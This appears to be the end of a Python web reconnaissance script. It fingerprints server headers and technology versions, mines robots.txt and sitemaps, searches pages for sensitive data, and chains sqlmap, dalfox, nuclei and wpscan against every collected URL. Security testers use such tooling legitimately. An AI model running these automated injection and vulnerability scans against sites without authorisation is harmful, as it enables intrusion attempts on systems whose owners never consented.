            r"Python|Perl|Ruby|Go|Rust|Java|Mono|"
            r"MySQL|PostgreSQL|MariaDB|SQLite|MongoDB|Redis|ElasticSearch|"
            r"React|Angular|Vue\.js|Svelte|jQuery|Next\.js|Nuxt|Ember|Backbone|middleware|"
            r"Webpack|Babel|Grunt|Gulp|Vite|Rollup|"
            r"CVSS|CVE"
            r")[/ ]?[\w\.-]*\d[\w\.-]*",
            re.IGNORECASE
        )

        middleware_headers = {
            "serveurs": ["Server", "X-AspNet-Version", "X-Powered-By", "X-AspNetMvc-Version", "X-Runtime", "X-Python-Version"],
            "cms/frameworks": ["X-Generator", "X-Pingback", "X-Drupal-Cache"],
            "cdn/waf": ["CF-RAY", "CF-Cache-Status", "X-Amz-Cf-Id", "X-Amzn-Trace-Id", "X-Akamai-", "X-Fastly-", "X-CDN"],
            "proxies/load_balancers": ["Via", "X-Forwarded-For", "X-Real-IP", "X-Served-By", "X-Cache", "X-Backend-Server", "X-Proxy-Cache", "x-middleware-subrequest"]
        }

        maxlen = max(len(header) for header in response.headers.keys())

        for header, value in response.headers.items():
            # Recherche d'une version de techno
            match = version_pattern.search(value)
            is_flagged0 = False
            if match:
                highlighted = value.replace(match.group(), f"{R}{match.group()}{Y}")
                is_flagged0 = True
            else:
                highlighted = value

            # Vérifier si c'est un header "sensible"
            is_flagged = False
            for patterns in middleware_headers.values():
                for pattern in patterns:
                    if pattern.lower() in header.lower():
                        is_flagged = True
                        break
                if is_flagged:
                    break

            spacing = " " * (maxlen - len(header))  # alignement des colonnes
            if is_flagged:
                print(f"{R}[!] {header}{spacing} {G}: {Y}{highlighted}")
            else:
                if is_flagged0:
                    print(f"{R}[!] {G}{header}{spacing} {G}: {Y}{highlighted}")
                else:
                    print(f"    {G}{header}{spacing} {G}: {Y}{highlighted}")
        print("")
        conn.close()
           
        fetch_rdap_info(base_domain)

        print(f"\n{M}[Info] {G}Checking robots & sitemap")
        robots_url = urljoin(args.url, "/robots.txt")
        try:
            r = requests.get(robots_url, timeout=10)
            if r.status_code == 200:
                print(f"{M}[+] {G}Found : {Y}{robots_url}")
                
                disallow_paths = re.findall(r"(?i)Disallow:\s*(\S+)", r.text)
                if disallow_paths:
                    for path in disallow_paths:
                        if path.strip() == "/":
                            continue
                        full_url = urljoin(args.url, path)
                        print(f"   {Y}> {G}{full_url}")

                sitemap_links = re.findall(r"(?i)Sitemap:\s*(\S+)", r.text)
                for link in sitemap_links:
                    print(f"{M}[+] {G}Found : {Y}{link}")
                    try:
                        r = requests.get(link, timeout=10)
                        if r.status_code == 200:
                            soup = BeautifulSoup(r.content, "xml")
                            urls = soup.find_all("loc")
                            if urls:
                                for loc in urls:
                                    print(f"   {Y}> {G}{loc.text}")
                        else:
                            print(f"   {R}[!] Could not access: {link}")
                    except Exception as e:
                        print(f"   {R}[Error] {e}")
            else:
                print(f"{M}[-] Not found : {Y}{robots_url}")
        except Exception as e:
            print(f"[Error] {e}")

        
        # Wappalyzer
        if not args.url.startswith(('http://', 'https://')):
            args.url = 'https://' + args.url
        
        versions = wappalyze_that(args.url, cookies)
 
        

    if args.vuln:
        # Wappalyzer
        if not args.url.startswith(('http://', 'https://')):
            args.url = 'https://' + args.url
        
        print(f"\n{M}[Info] {C}Checking for vulnerable versions")    
        versions = wappalyze_that(args.url, cookies)
        is_there_a_vuln(versions, args.url)



    if args.wtf:
        if args.wayback or args.extract:
            print(f"{M}[Info] {C}Searching for sensitive data on base target {args.url}...")
            for links in outputlist:
                print(f"\n{M}[!] {C}[view-source:{links}]")
                process_page(links)
        else:    
            if not args.url.startswith(('http://', 'https://')):
                args.url = 'http://' + args.url
            print(f"{M}[Info] {C}Searching for sensitive data on {args.url}...")
            print(f"\n{M}[!] {C}[view-source:{args.url}]")
            process_page(args.url)  

      
    # Save results to a file if requested
    if args.output:
        print(f"\n{M}[Info] {C}Saving output file ...")
        if not (args.robots or args.wayback or args.extract):
            print(f"{M}[Info] {R}Error : Missing required arguments. Please provide one of the following arguments : --robots, --wayback and --extract")
        else:    
            # Définir des valeurs par défaut sûres
            output_data = outputlist
            output_data = output_data if output_data is not None else []  

            #output_robots = extract_robots if args.robots else set()
            #output_robots = output_robots if output_robots is not None else set()  

            # Combiner les données
            output_data_combined = list(output_data) # + list(output_robots)
            
            with open(args.output, 'w', encoding='utf-8') as f:
                f.write("\n".join(output_data_combined))
            print(f"{M}[Info] {G}Results saved to {Y}{args.output}")



    if args.sqlmap:
        
        filepath = loadit("install_paths/sqlmap.txt")

        if isinstance(filepath, list):
            filepath = filepath[0]  # takes first element                


        if filepath is None:
            print(f"{M}[Info] {G}no sqlmap path provided in install_paths/sqlmap.txt")
            sys.exit()
        else:
            sqlmap_check = check_installation_path(filepath)
            if sqlmap_check == "yes":
                
                for links in outputlist:
                    sqlmap_path_expanded = os.path.expanduser(filepath)
                    default_sqlmap_command = [sqlmap_path_expanded, links, "--batch"]

                    if setup_parameters_sqlmap.strip():
                        sqlmap_args = shlex.split(setup_parameters_sqlmap)  
                        command = default_sqlmap_command + sqlmap_args
                    else:
                        command = default_sqlmap_command  

                    print(f"{M}[Info] {G}Launching the following command :{Y}")
                    print(command)
                    print(f"{M}[Info] {G}Current target : {C}{links}")
                    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

                    # Capture and print output in real-time
                    for line in iter(process.stdout.readline, ''):
                        print(f"{G}{line.strip()}")
                    
                    for line in iter(process.stderr.readline, ''):
                        print(f"{R}{line.strip()}")
                    
                    process.stdout.close()
                    process.stderr.close()
                    process.wait()  # Wait for the process to finish  


    if args.dalfox:
        
        filepath = loadit("install_paths/dalfox.txt")

        if isinstance(filepath, list):
            filepath = filepath[0]  # takes first element                


        if filepath is None:
            print(f"{M}[Info] {G}no dalfox path provided in install_paths/dalfox.txt")
            sys.exit()
        else:
            dalfox_check = check_installation_path(filepath)
            if dalfox_check == "yes":
                
                for links in outputlist:
                    dalfox_path_expanded = os.path.expanduser(filepath)
                    default_dalfox_command = [dalfox_path_expanded, "url", links]

                    if setup_parameters_dalfox.strip():
                        dalfox_args = shlex.split(setup_parameters_dalfox)  
                        command = default_dalfox_command + dalfox_args
                    else:
                        command = default_dalfox_command  

                    print(f"{M}[Info] {G}Launching the following command :{Y}")
                    print(command)
                    print(f"{M}[Info] {G}Current target : {C}{links}")
                    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

                    # Capture and print output in real-time
                    for line in iter(process.stdout.readline, ''):
                        print(f"{G}{line.strip()}")
                    
                    for line in iter(process.stderr.readline, ''):
                        print(f"{R}{line.strip()}")
                    
                    process.stdout.close()
                    process.stderr.close()
                    process.wait()  # Wait for the process to finish  


    if args.nuclei:
        
        filepath = loadit("install_paths/nuclei.txt")

        if isinstance(filepath, list):
            filepath = filepath[0]  # takes first element                


        if filepath is None:
            print(f"{M}[Info] {G}no nuclei path provided in install_paths/nuclei.txt")
            sys.exit()
        else:
            nuclei_check = check_installation_path(filepath)
            if nuclei_check == "yes":
                
                for links in outputlist:
                    nuclei_path_expanded = os.path.expanduser(filepath)
                    default_nuclei_command = [nuclei_path_expanded, "-u", links]

                    if setup_parameters_nuclei.strip():
                        nuclei_args = shlex.split(setup_parameters_nuclei)  
                        command = default_nuclei_command + nuclei_args
                    else:
                        command = default_nuclei_command 

                    print(f"{M}[Info] {G}Launching the following command :{Y}")
                    print(command)
                    print(f"{M}[Info] {G}Current target : {C}{links}")
                    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

                    # Capture and print output in real-time
                    for line in iter(process.stdout.readline, ''):
                        print(f"{G}{line.strip()}")
                    
                    for line in iter(process.stderr.readline, ''):
                        print(f"{R}{line.strip()}")
                    
                    process.stdout.close()
                    process.stderr.close()
                    process.wait()  # Wait for the process to finish  



    if args.wpscan:
        if rootornot == "yes":
            filepath = loadit("install_paths/wpscan.txt")

            if isinstance(filepath, list):
                filepath = filepath[0]  # takes first element                


            if filepath is None:
                print(f"{M}[Info] {G}no wpscan path provided in install_paths/wpscan.txt")
                sys.exit()
            else:
                wpscan_check = check_installation_path(filepath)
                if wpscan_check == "yes":
                    
                    wpscan_path_expanded = os.path.expanduser(filepath)
                    default_wpscan_command = [wpscan_path_expanded, "--url", args.url, "--no-update", "--no-banner"] # one url to scan
                     
                    if setup_parameters_wpscan.strip():
                        wpscan_args = shlex.split(setup_parameters_wpscan)
                        command = default_wpscan_command + wpscan_args
                    else:
                        command = default_wpscan_command

                    print(f"{M}[Info] {G}Launching the following command :{Y}")
                    print(command)
                    print(f"{M}[Info] {G}Current target : {C}{args.url}")
                    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

                    # Capture and print output in real-time
                    for line in iter(process.stdout.readline, ''):
                        print(f"{G}{line.strip()}")
                    
                    for line in iter(process.stderr.readline, ''):
                        print(f"{R}{line.strip()}")
                    
                    process.stdout.close()
                    process.stderr.close()
                    process.wait()  # Wait for the process to finish  


    print(f"\n\n{M}[Info] {Y}End of search")


if __name__ == "__main__":
    main()
